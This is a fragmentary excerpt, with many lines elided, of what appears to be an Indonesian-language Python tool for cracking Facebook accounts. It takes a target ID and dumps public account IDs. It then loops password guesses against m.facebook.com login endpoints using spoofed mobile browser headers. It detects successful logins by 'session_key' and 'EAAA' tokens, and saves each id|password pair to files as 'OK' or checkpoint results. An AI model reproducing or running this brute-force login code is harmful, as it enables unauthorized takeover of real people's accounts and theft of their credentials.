...
def file():
	...
	sol().print(mark(tek, style='green'), style='on red')
...
def dump_publik():
	...
	pil = input(x+'['+h+'f'+x+'] INPUT TARGET ID : ')
...
def setting():
	...
	aplik = input(x+'['+h+'f'+x+'] Tampilkan Aplikasi Tertaut ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+h+'f'+x+'] Tampilkan Opsi Checkpoint  ? (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	woi = input(x+'['+h+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer": "https://m.facebook.com/login/device-based/password/?uid=""&flow=login_no_pin","accept-encoding":"gzip, deflate br","accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [WIDI-CP] %s|%s        '%(k,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%s [WIDI-OK] %s|%s        '%(h,idf,pw))
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s OK %s|%s        %s'%(h,id,pw,x))
			else:
				print('\r%s SALAH %s|%s        %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
